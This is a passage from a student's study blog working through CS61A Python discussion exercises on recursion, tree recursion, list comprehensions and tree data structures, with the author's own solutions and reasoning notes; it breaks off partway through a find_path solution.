<h1 id="More-Recursion"><a href="#More-Recursion" class="headerlink" title="More Recursion"></a>More Recursion</h1><p>In discussion 1, we implemented the function <code>is_prime</code>, which takes in a positive integer and returns whether or not that integer is prime, iteratively.<br>Now, let’s implement it recursively! As a reminder, an integer is considered prime if it has exactly two unique factors: 1 and itself.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># My solution, from iteration to recursion</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_prime</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; is_prime(7)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; is_prime(10)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; is_prime(1)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prime_helper</span><span class="params">(n, k)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> k &gt; sqrt(n):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> n % k == <span class="number">0</span> <span class="keyword">or</span> n == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> prime_helper(n, k+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> prime_helper(n, <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_prime</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prime_helper</span><span class="params">(index)</span>:</span></span><br><span class="line">        <span class="comment"># if n &gt; sqrt(n):</span></span><br><span class="line">        <span class="keyword">if</span> n == index:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> n % index == <span class="number">0</span> <span class="keyword">or</span> n == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> prime_helper(index + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> prime_helper(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>Define a function <code>make_fn_repeater</code> which takes in a one-argument function <code>f</code> and an integer <code>x</code>. It should return another function which takes in one argument, another integer. This function returns the result of applying <code>f</code> to <code>x</code> this number of times.</p>
<p>Make sure to use recursion in your solution</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_func_repeater</span><span class="params">(f, x)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; incr_1 = make_func_repeater(lambda x: x + 1, 1)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; incr_1(2) #same as f(f(x))</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; inct_1(5)</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">repeat</span><span class="params">(i)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> f(repeat(i - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> repeat</span><br></pre></td></tr></table></figure>

<h1 id="Tree-Recursion"><a href="#Tree-Recursion" class="headerlink" title="Tree Recursion"></a>Tree Recursion</h1><p>Consider a function that requires more than one recursive call. A simple example is the recursive <code>fibonacci</code> function:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> fib(n - <span class="number">1</span>) + fib(n - <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>This type of recursion is called <code>tree recursion</code>, because it makes more than one recursive call in its recursive case. If we draw out the recursive calls, we see the recursive calls in the shape of an upside-down tree:</p>


<p>We could, in theory, use loops to write the same procedure. However, problems that are naturally solved using tree recursive procedures are generally difficult to write iteratively. It is sometimes the case that a tree recursive<br>problem also involves iteration: for example, you might use a while loop to add together multiple recursive calls.<br>As a general rule of thumb, whenever you need to try multiple possibilities at the same time, you should consider using tree recursion.</p>
<h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p>I want to go up a flight of stairs that has <code>n</code> steps. I can either take 1 or 2 steps each time. How many different ways can I go up this flight of stairs?<br>Write a function <code>count_stair_ways</code> that solves this problem for me. Assume <code>n</code> is positive.<br>Before we start, what’s the base case for this question? What is the simplest input?</p>
<p><span style="color:red">When there is only one step, we have only one way to go up the stair. When there are two steps, we have two ways: take a two-step or take 2 one-steps.</span></p>
<p>What do <code>count_stair_ways(n - 1)</code> and <code>count_stair_ways(n - 2)</code> represent?</p>
<p><span style="color:red"><code>count_stair_ways(n - 1)</code> represents the number of ways to go up to the first <code>n-1</code> stairs. <code>count_stair_ways(n - 2)</code> represents the number of ways to go up to the first <code>n-2</code> stairs.</span></p>
<p>Use those two recursive calls to write the recursive case:</p>
<figure class="highlight plain"><figcaption><span>count_stair_ways(n):</span></figcaption><table><tr><td class="code"><pre><span class="line">if n &#x3D;&#x3D; 1:</span><br><span class="line">    return 1</span><br><span class="line">elif n &#x3D;&#x3D; 2:</span><br><span class="line">    return 2</span><br><span class="line">else:</span><br><span class="line">    return count_stair_ways(n - 1) + count_stair_ways(n - 2)</span><br></pre></td></tr></table></figure>

<p>Consider a special version of the <code>count_stairways</code> problem, where instead of taking 1 or 2 steps, we are able to take <strong>up to and including k</strong> steps at a time.<br>Write a function <code>count_k</code> that figures out the number of paths for this scenario. Assume <code>n</code> and <code>k</code> are positive.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_k</span><span class="params">(n, k)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_k(3, 3) # 3, 2 + 1, 1 + 2, 1 + 1 + 1</span></span><br><span class="line"><span class="string">    4</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_k(4, 4)</span></span><br><span class="line"><span class="string">    8</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_k(10, 3)</span></span><br><span class="line"><span class="string">    274</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_k(300, 1) # Only one step at a time</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> n &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        total = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt;= k:</span><br><span class="line">            total += count_k(n - i, k)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> total</span><br></pre></td></tr></table></figure>
<p><span style="color:red">This seems to be like the partition code in the lecture, but when I use the way of partition to solve this problem, I find a significant bug which is that in out partition, 1 plus 2 and 2 plus 1 is considered to be the same kind, but in our stairs code, I first go up 2 stairs then 1 stair is considered to be different from first going up 1 stair and then go 2 stairs. So we need another kind of thought to solve this, which uses a loop.<a href="https://www.youtube.com/watch?v=oGBcPguM9vo&list=PLx38hZJ5RLZd35oDi3TGz5p9DyyxU3WwA&index=5" target="_blank" rel="noopener">Video walkthrough</a></span></p>
<p>Here’s a part of the Pascal’s triangle:</p>


<p>Every number in Pascal’s triangle is defined as the sum of the item above it and the item that is directly to the upper left of it, use 0 if the entry is empty. Define the procedure <code>pascal(row, column)</code> which takes a <code>row</code> and a <code>column</code>, and finds the value at that position in the triangle.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># My solution, by observing that the number above leading diagonal is all zero.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pascal</span><span class="params">(row, column)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> column == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> column &gt; row:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pascal(row - <span class="number">1</span>, column - <span class="number">1</span>) + pascal(row - <span class="number">1</span>, column)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># The pdf solution, which has a subtle difference at the condition of returning zero.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pascal</span><span class="params">(row, column)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> column == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> row == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pascal(row - <span class="number">1</span>, column - <span class="number">1</span>) + pascal(row - <span class="number">1</span>, column)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-disc04</title>
    <url>/2018/10/08/cs61a-disc04/</url>
    <content><![CDATA[<h1 id="Lecture-Code"><a href="#Lecture-Code" class="headerlink" title="Lecture Code"></a>Lecture Code</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Slicing</span></span><br><span class="line"></span><br><span class="line">odds = [<span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>]</span><br><span class="line">list(range(<span class="number">1</span>, <span class="number">3</span>))</span><br><span class="line">[odds[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">3</span>)]</span><br><span class="line">odds[<span class="number">1</span>:<span class="number">3</span>]</span><br><span class="line">odds[<span class="number">1</span>:]</span><br><span class="line">odds[:<span class="number">3</span>]</span><br><span class="line">odds[:]</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Aggregation</span></span><br><span class="line"></span><br><span class="line">sum(odds)</span><br><span class="line">sum(&#123;<span class="number">3</span>:<span class="number">9</span>, <span class="number">5</span>:<span class="number">25</span>&#125;)</span><br><span class="line">max(range(<span class="number">10</span>))</span><br><span class="line">max(range(<span class="number">10</span>), key=<span class="keyword">lambda</span> x: <span class="number">7</span> - (x<span class="number">-2</span>)*(x<span class="number">-4</span>))</span><br><span class="line">all([x &lt; <span class="number">5</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">5</span>)])</span><br><span class="line">perfect_square = <span class="keyword">lambda</span> x: x == round(x ** <span class="number">0.5</span>) ** <span class="number">2</span></span><br><span class="line">any([perfect_square(x) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">50</span>, <span class="number">60</span>)]) <span class="comment"># Try ,65)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Trees</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tree</span><span class="params">(label, branches=[])</span>:</span></span><br><span class="line">    <span class="keyword">for</span> branch <span class="keyword">in</span> branches:</span><br><span class="line">        <span class="keyword">assert</span> is_tree(branch), <span class="string">'branches must be trees'</span></span><br><span class="line">    <span class="keyword">return</span> [label] + list(branches)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">label</span><span class="params">(tree)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> tree[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">branches</span><span class="params">(tree)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> tree[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_tree</span><span class="params">(tree)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(tree) != list <span class="keyword">or</span> len(tree) &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> branch <span class="keyword">in</span> branches(tree):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_tree(branch):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_leaf</span><span class="params">(tree)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> branches(tree)</span><br><span class="line"></span><br><span class="line"><span class="comment">### +++ === ABSTRACTION BARRIER === +++ ###</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib_tree</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Construct a Fibonacci tree.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fib_tree(1)</span></span><br><span class="line"><span class="string">    [1]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fib_tree(3)</span></span><br><span class="line"><span class="string">    [2, [1], [1, [0], [1]]]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fib_tree(5)</span></span><br><span class="line"><span class="string">    [5, [2, [1], [1, [0], [1]]], [3, [1, [0], [1]], [2, [1], [1, [0], [1]]]]]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> <span class="keyword">or</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> tree(n)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        left = fib_tree(n<span class="number">-2</span>)</span><br><span class="line">        right = fib_tree(n<span class="number">-1</span>)</span><br><span class="line">        fib_n = label(left) + label(right)</span><br><span class="line">        <span class="keyword">return</span> tree(fib_n, [left, right])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_leaves</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="string">"""The number of leaves in tree.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_leaves(fib_tree(5))</span></span><br><span class="line"><span class="string">    8</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> is_leaf(t):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> sum([count_leaves(b) <span class="keyword">for</span> b <span class="keyword">in</span> branches(t)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaves</span><span class="params">(tree)</span>:</span></span><br><span class="line">    <span class="string">"""Return a list containing the leaf labels of tree.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; leaves(fib_tree(5))</span></span><br><span class="line"><span class="string">    [1, 0, 1, 0, 1, 1, 0, 1]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> is_leaf(tree):</span><br><span class="line">        <span class="keyword">return</span> [label(tree)]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> sum([leaves(b) <span class="keyword">for</span> b <span class="keyword">in</span> branches(tree)], [])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_tree</span><span class="params">(t, indent=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="string">"""Print a representation of this tree in which each label is</span></span><br><span class="line"><span class="string">    indented by two spaces times its depth from the root.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(tree(1))</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(tree(1, [tree(2)]))</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">      2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(fib_tree(4))</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">      1</span></span><br><span class="line"><span class="string">        0</span></span><br><span class="line"><span class="string">        1</span></span><br><span class="line"><span class="string">      2</span></span><br><span class="line"><span class="string">        1</span></span><br><span class="line"><span class="string">        1</span></span><br><span class="line"><span class="string">          0</span></span><br><span class="line"><span class="string">          1</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    print(<span class="string">'  '</span> * indent + str(label(t)))</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> branches(t):</span><br><span class="line">        print_tree(b, indent + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">increment_leaves</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="string">"""Return a tree like t but with leaf labels incremented.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(increment_leaves(fib_tree(4)))</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">      1</span></span><br><span class="line"><span class="string">        1</span></span><br><span class="line"><span class="string">        2</span></span><br><span class="line"><span class="string">      2</span></span><br><span class="line"><span class="string">        2</span></span><br><span class="line"><span class="string">        1</span></span><br><span class="line"><span class="string">          1</span></span><br><span class="line"><span class="string">          2</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> is_leaf(t):</span><br><span class="line">        <span class="keyword">return</span> tree(label(t) + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bs = [increment_leaves(b) <span class="keyword">for</span> b <span class="keyword">in</span> branches(t)]</span><br><span class="line">        <span class="keyword">return</span> tree(label(t), bs)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">increment</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="string">"""Return a tree like t but with all labels incremented.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print_tree(increment(fib_tree(4)))</span></span><br><span class="line"><span class="string">    4</span></span><br><span class="line"><span class="string">      2</span></span><br><span class="line"><span class="string">        1</span></span><br><span class="line"><span class="string">        2</span></span><br><span class="line"><span class="string">      3</span></span><br><span class="line"><span class="string">        2</span></span><br><span class="line"><span class="string">        2</span></span><br><span class="line"><span class="string">          1</span></span><br><span class="line"><span class="string">          2</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> tree(label(t) + <span class="number">1</span>, [increment(b) <span class="keyword">for</span> b <span class="keyword">in</span> branches(t)])</span><br></pre></td></tr></table></figure>

<h1 id="1-List-Comprehensions"><a href="#1-List-Comprehensions" class="headerlink" title="1 List Comprehensions"></a>1 List Comprehensions</h1><p>A list comprehension is a compact way to create a list whose elements are the results of applying a fixed expression to elements in another sequence.<br><code>[&lt;map exp&gt; for &lt;name&gt; in &lt;iter exp&gt; if &lt;filter exp&gt;]</code><br>It might be helpful to note that we can rewrite a list comprehension as an equivalent for statement. See the example.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_lst = []</span><br><span class="line"><span class="keyword">for</span> &lt;name&gt; <span class="keyword">in</span> &lt;iter exp&gt;:</span><br><span class="line">    <span class="keyword">if</span> &lt;filter exp&gt;:</span><br><span class="line">        new_lst += [&lt;map_exp&gt;]</span><br><span class="line"><span class="keyword">return</span> new_lst</span><br></pre></td></tr></table></figure>
<p>Let’s break down an example:<br><code>[x * x - 3 for x in [1, 2, 3, 4, 5] if x % 2 == 1]</code><br>In this list comprehension, we are creating a new list after performing a series of operations to our initial sequence <code>[1, 2, 3, 4, 5]</code>. We only keep the elements that satisfy the filter expression <code>x % 2 == 1</code> (1, 3, and 5). For each retained element, we apply the map expression <code>x*x - 3</code> before adding it to the new list that we are creating, resulting in the output <code>[-2, 6, 22]</code>.<br>Note: The <code>if</code> clause in a list comprehension is optional.</p>
<h2 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h2><p>What would Python display?</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; [i + 1 for i in [1, 2, 3, 4, 5] if i % 2 &#x3D;&#x3D; 0]</span><br><span class="line">[3, 5]</span><br><span class="line">&gt;&gt;&gt; [i * i - i for i in [5, -1, 3, -1, 3] if i &gt; 2]</span><br><span class="line">[20, 6, 6]</span><br><span class="line">&gt;&gt;&gt; [[y * 2 for y in [x, x + 1]] for x in [1, 2, 3, 4]]</span><br><span class="line">[[2, 4], [4, 6], [6, 8], [8, 10]]</span><br></pre></td></tr></table></figure>

<h1 id="2-Trees"><a href="#2-Trees" class="headerlink" title="2 Trees"></a>2 Trees</h1><p>In computer science, trees are recursive data structures that are widely used in various settings. The diagram to the right is an example of a tree.</p>


<p>Notice that the tree branches downward. In computer science, the root of a tree starts at the top, and the leaves are at the bottom.<br>Some terminology regarding trees:<br>• Parent node: A node that has branches. Parent nodes can have<br>multiple branches.<br>• Child node: A node that has a parent. A child node can only belong<br>to one parent.<br>• Root: The top node of the tree. In our example, the node that contains 7 is the root.<br>• Label: The value at a node. In our example, all of the integers are<br>values.<br>• Leaf: A node that has no branches. In our example, the nodes that<br>contain −4, 0, 6, 17, and 20 are leaves.<br>• Branch: A subtree of the root. Note that trees have branches, which<br>are trees themselves: this is why trees are recursive data structures.<br>• Depth: How far away a node is from the root. In other words, the<br>number of edges between the root of the tree to the node. In the<br>diagram, the node containing 19 has depth 1; the node containing 3<br>has depth 2. Since there are no edges between the root of the tree and<br>itself, the depth of the root is 0.<br>• Height: The depth of the lowest leaf. In the diagram, the nodes<br>containing −4, 0, 6, and 17 are all the “lowest leaves,” and they have<br>depth 4. Thus, the entire tree has height 4.<br>In computer science, there are many different types of trees. Some vary in the number of branches each node has; others vary in the structure of the tree.</p>
<h2 id="mplementation"><a href="#mplementation" class="headerlink" title="mplementation"></a>mplementation</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Constructor</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tree</span><span class="params">(label, branches=[])</span>:</span></span><br><span class="line">    <span class="keyword">for</span> branch <span class="keyword">in</span> branches:</span><br><span class="line">        <span class="keyword">assert</span> is_tree(branch)</span><br><span class="line">        <span class="keyword">return</span> [label] + list(branches)</span><br><span class="line"><span class="comment"># Selectors</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">label</span><span class="params">(tree)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> tree[<span class="number">0</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">branches</span><span class="params">(tree)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> tree[<span class="number">1</span>:]</span><br><span class="line"><span class="comment"># For convenience</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_leaf</span><span class="params">(tree)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> branches(tree)</span><br></pre></td></tr></table></figure>
<p>A tree has both a value for the root node and a sequence of branches, which are also trees. In our implementation, we represent the branches as a list of trees. Since a tree is an abstract data type, our choice to use lists is just an implementation detail.<br>• The arguments to the constructor tree are the value for the root node and a list of branches.<br>• The selectors for these are label and branches.<br>Note that branches returns a list of trees and not a tree directly. It’s important to distinguish between working with a tree and working with a list of trees.<br>We have also provided a convenience function, is_leaf.<br>Let’s try to create the tree below.</p>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Example tree construction</span></span><br><span class="line">t = tree(<span class="number">1</span>,</span><br><span class="line">    [tree(<span class="number">3</span>,</span><br><span class="line">        [tree(<span class="number">4</span>),</span><br><span class="line">        tree(<span class="number">5</span>),</span><br><span class="line">        tree(<span class="number">6</span>)]),</span><br><span class="line">    tree(<span class="number">2</span>)])</span><br></pre></td></tr></table></figure>
<h2 id="Questions-1"><a href="#Questions-1" class="headerlink" title="Questions"></a>Questions</h2><p>2.1 Write a function that returns the largest number in a tree.<br><span style="color:red">When we talk about recursion, what we should think. That’s a problem, especially dealing with trees. The base case is also a leaf, then we use recursion to find the largest label including current label. Then we have the following.</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tree_max</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="string">"""Return the maximum label in a tree.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t = tree(4, [tree(2, [tree(1)]), tree(10)])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tree_max(t)</span></span><br><span class="line"><span class="string">    10</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> is_leaf(t):</span><br><span class="line">        <span class="keyword">return</span> label(t)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> max([label(t)] + [tree_max(b) <span class="keyword">for</span> b <span class="keyword">in</span> branches(t)])</span><br></pre></td></tr></table></figure>
<p>2.2 Write a function that returns the height of a tree. Recall that the height of a tree is the length of the longest path from the root to a leaf.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">height</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="string">"""Return the height of a tree.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t = tree(3, [tree(5, [tree(1)]), tree(2)])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; height(t)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> is_leaf(t):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + max([height(b) <span class="keyword">for</span> b <span class="keyword">in</span> branches(t)])</span><br></pre></td></tr></table></figure>
<p>2.3 Write a function that takes in a tree and squares every value. It should return a new tree. You can assume that every item is a number.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">square_tree</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="string">"""Return a tree with the square of every element in t"""</span></span><br><span class="line">    <span class="keyword">return</span> tree(label(t) ** <span class="number">2</span>, [square_tree(b) <span class="keyword">for</span> b <span class="keyword">in</span> branches(t)])</span><br></pre></td></tr></table></figure>
<p>2.4 Write a function that takes in a tree and a value <code>x</code> and returns a list containing the nodes along the path required to get from the root of the tree to a node containing <code>x</code>.<br>If <code>x</code> is not present in the tree, return <code>None</code>. Assume that the entries of the tree are unique.<br>For the following tree, <code>find path(t, 5)</code> should return <code>[2, 7, 6, 5]</code></p>


<p><span style="color:red">This seems to be a hard problem, the way we think of it is first the base case. So what is the base case of this question? I think maybe when the label of current tree is exactly the same as x, then we can return a list which consists x or label(tree). Then we should think the recursive case. When we are in the location of some path, we need to keep a paths variable, which is a list, consisting of a series of paths. But in this problem, we only have one path. So if x is in the tree, it must be one path, otherwise the path may be None. Then when we find a path, we need to append the path to our current label. And the game is over. We can either explictly return None or do nothing, which implictly returns None</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_path</span><span class="params">(tree, x)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; t = tree(2, [tree(7, [tree(3), tree(6, [tree(5), tree(11)])] ), tree(15)])</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; find_path(t, 5)</span></span><br><span class="line"><span class="string">    [2, 7, 6, 5]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; find_path(t, 10) # returns None</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> label(tree) == x:</span><br><span class="line">        <span class="keyword">return</span> [label(tree)]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        paths = [find_path(b, x) <span class="keyword">for</span> b <span class="keyword">in</span> branches(tree)]</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> paths:</span><br><span class="line">            <span class="keyword">if</span> path:</span><br><span class="line">                <span 